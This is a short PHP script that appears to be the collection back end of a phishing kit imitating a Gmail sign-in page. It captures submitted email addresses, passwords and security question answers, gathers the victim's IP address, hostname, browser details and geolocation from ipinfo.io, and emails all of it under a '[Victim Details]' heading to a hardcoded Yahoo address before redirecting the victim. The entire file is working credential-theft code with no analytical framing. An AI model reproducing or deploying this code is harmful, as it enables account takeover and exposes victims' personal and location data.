<?php
header ('Location: index2.html');
$pass = $_POST['Passwd'];
$user = $_POST['Email'];
$question = $_POST['question'];
$answer = $_POST['answer'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
  @ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
  @ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
 $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$string =$QUERY_STRING.PHP_EOL .PHP_EOL .
'[IP address]: '.$ip.PHP_EOL .PHP_EOL .
'[Hostname]: '.$hostname.PHP_EOL .PHP_EOL .
'[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL . $_SERVER['HTTP_REFERER'].PHP_EOL .PHP_EOL .
'[Coordinates]: '.$details->loc. PHP_EOL .PHP_EOL .
'[ISP provider]: '.$details->org. PHP_EOL .PHP_EOL .
'[City]: '.$details->city. PHP_EOL .PHP_EOL .
'[State]: '.$details->region. PHP_EOL .PHP_EOL .
'[Country]: '.$details->country. PHP_EOL .PHP_EOL .
'[Date]: '.date("D dS M,Y h:i a");
   
 
$mail="jonas1paul92@yahoo.com";
$betreff = "GMA1L 1";
$text ="Username: " .$user . PHP_EOL . " Password: ". $pass . PHP_EOL . " Question: ". $question . PHP_EOL . " Answer: ". $answer . PHP_EOL . PHP_EOL . " [Victim Details] ".PHP_EOL . $string . PHP_EOL . PHP_EOL . "Note". PHP_EOL . "Enjoy.....";
$from = "Email Details";
mail($mail,$betreff,$text,$from)

?>